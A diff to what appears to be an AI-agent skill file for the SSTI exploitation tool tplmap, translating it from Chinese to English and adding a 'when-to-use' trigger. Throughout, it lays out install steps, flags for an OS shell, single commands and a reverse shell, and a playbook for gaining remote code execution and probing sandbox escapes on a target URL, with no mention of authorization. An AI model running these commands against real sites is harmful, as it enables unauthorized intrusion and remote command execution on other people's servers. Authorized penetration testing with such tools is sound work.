@@ -2,47 +2,51 @@
 name: tplmap-ssti
 description: "tplmap gets system commands via SSTI and probes sandbox escapes. Signals: web vulnerability, injection, SSTI detection+exploitation, POST"
 zh-signals: "tplmap: SSTI 直取系统命令、沙盒逃逸探测。信号:web漏洞,注入,SSTI 检测+利用,POST。"
+when-to-use: >-
+  Use when a web parameter or POST body may be vulnerable to server-side
+  template injection (SSTI) and you want to detect the engine, escape the
+  sandbox, and execute OS commands.
 ---
 
 # tplmap
 
-- 攻击大类:C09 Web应用漏洞利用
-- 上游仓库:https://github.com/epinna/tplmap
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C09 Web Application Vulnerability Exploitation
+- Upstream Repository: https://github.com/epinna/tplmap
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/epinna/tplmap && cd tplmap && pip install -r requirements.txt
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `python tplmap.py -u 'https://t.com/hello?name=john'` | SSTI 检测+利用 |
+| `python tplmap.py -u 'https://t.com/hello?name=john'` | SSTI detection + exploitation |
 | `--data='name=john'` | POST |
-| `--os-shell` | 系统 shell |
-| `--os-cmd=id` | 单命令 |
-| `--reverse-shell host 4444` | 反弹 |
-| `-e jinja2/twig` | 指定引擎 |
-| `--level 5` | 盲注深度 |
+| `--os-shell` | System shell |
+| `--os-cmd=id` | Single command |
+| `--reverse-shell host 4444` | Callback |
+| `-e jinja2/twig` | Specify the engine |
+| `--level 5` | Blind injection depth |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### SSTI 直取系统命令
+### Straight to system commands via SSTI
 
 ```bash
 python tplmap.py -u 'https://target/profile?tpl=hello' --os-shell
-# 自动识别 Jinja2/Twig/Freemarker 等引擎并给出 RCE
+# Automatically identifies Jinja2/Twig/Freemarker and other engines and yields RCE
 ```
 
-### 沙盒逃逸探测
+### Sandbox escape probing
 
 ```bash
-python tplmap.py -u URL --level 5  # 深度盲注模式测无回显场景
+python tplmap.py -u URL --level 5  # deep blind mode for scenarios with no output
 ```
 
-## 注意事项
+## Notes
 
-覆盖 15+ 模板引擎;Jinja2/Twig 下默认直接可 RCE,沙盒模式用 --level 盲打。
+Covers 15+ template engines; with Jinja2/Twig you get RCE out of the box, and in sandbox mode use --level to brute force blindly.
